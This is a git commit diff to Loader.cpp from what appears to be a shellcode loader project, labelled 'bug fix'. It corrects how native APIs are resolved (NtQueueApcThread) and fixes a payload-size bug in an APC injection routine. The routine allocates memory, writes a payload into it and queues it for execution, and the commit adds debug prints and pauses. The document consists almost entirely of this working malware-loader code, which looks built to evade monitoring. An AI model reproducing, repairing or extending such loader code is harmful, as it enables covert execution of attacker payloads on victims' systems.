bb4bfc0b79f5989100846e51519d601ddf06ade9
Kevin Romero <45984541+Kvn11@users.noreply.github.com>
2023-10-16 21:42:45 -0400

    bug fix

--- Loader/Loader.cpp
+++ Loader/Loader.cpp
@@ -20,12 +20,13 @@ BOOL Loader::InitSyscallStruct(OUT PSyscall st) {
 	st->pNtAllocateVirtualMemory =	(fnNtAllocateVirtualMemory)resolver.GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
 	st->pNtProtectVirtualMemory =	(fnNtProtectVirtualMemory)resolver.GetProcAddress(hNtdll, "NtProtectVirtualMemory");
 	st->pNtWriteVirtualMemory =		(fnNtWriteVirtualMemory)resolver.GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-	st->pNtQueueApcThread =			(fnNtQueueApcThread)resolver.GetProcAddress(hNtdll, "QueueApcThread");
+	st->pNtQueueApcThread =			(fnNtQueueApcThread)resolver.GetProcAddress(hNtdll, "NtQueueApcThread");
 
-	if (st->pNtAllocateVirtualMemory == NULL ||
-		st->pNtProtectVirtualMemory == NULL ||
-		st->pNtWriteVirtualMemory == NULL ||
-		st->pNtQueueApcThread == NULL) {
+	if (st->pNtAllocateVirtualMemory	== NULL ||
+		st->pNtProtectVirtualMemory		== NULL ||
+		st->pNtWriteVirtualMemory		== NULL ||
+		st->pNtQueueApcThread			== NULL) {
+		printf("[!] Syscall struct contains null functions !!!\n");
 		return FALSE;
 	}
 	else {
@@ -34,15 +35,24 @@ BOOL Loader::InitSyscallStruct(OUT PSyscall st) {
 }
 
 BOOL Loader::ApcInjection(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
+	printf("[i] SIZE OF PAYLOAD AT START OF INJECTION 0: %zu\n", sPayloadSize);
 	sSize = sPayloadSize;
 	
 	// Allocate memory
 	if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
 		return FALSE;
 	}
+	printf("[+] Allocation of size: %zu\n", sSize);
 
 	// write payload
+	printf("[#] Press <Enter> To Write The Payload ...\n");
+	getchar();
+
+	printf("[i] SIZE OF PAYLOAD AT START OF INJECTION 1: %zu\n", sPayloadSize);
+	printf("\t[i] Writing Payload of Size %zu ...\n", sPayloadSize);
 	if ((STATUS = St.pNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, (PULONG)&sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
+		printf("[!] pNtWriteVirtualMemory Failed with Error : 0x%0.08X \n", STATUS);
+		printf("[i] Bytes Written : %zu of %zu\n", sNumberOfBytesWritten, sPayloadSize);
 		return FALSE;
 	}
 
@@ -52,21 +62,29 @@ BOOL Loader::ApcInjection(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPaylo
 	}
 
 	// Execute Payload:
+	printf("[#] Press <Enter> To Run the payload ...");
+	getchar();
 	if ((STATUS = St.pNtQueueApcThread(hThread, (PIO_APC_ROUTINE)pAddress, NULL, NULL, NULL)) != 0) {
+		printf("[!] NtQueueApcThread Failed !!!\n");
 		return FALSE;
 	}
+	printf("[+] DONE \n");
 	return TRUE;
 }
 
 int Loader::RunApcInjection(IN PVOID pPayload, IN SIZE_T sPayloadSize) {
 	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)AlertableFunction, NULL, NULL, NULL);
 	if (!hThread) {
+		printf("[!] CreateThread Failed !!!\n");
 		return -1;
 	}
 
-	if (!this->ApcInjection((HANDLE)-1, hThread, pPayload, sizeof(pPayload))) {
+	if (!this->ApcInjection((HANDLE)-1, hThread, pPayload, sPayloadSize)) {
 		return -1;
 	}
+
+	printf("[#] Press <Enter> To Quit ...\n");
+	getchar();
 	return 0;
 }
 
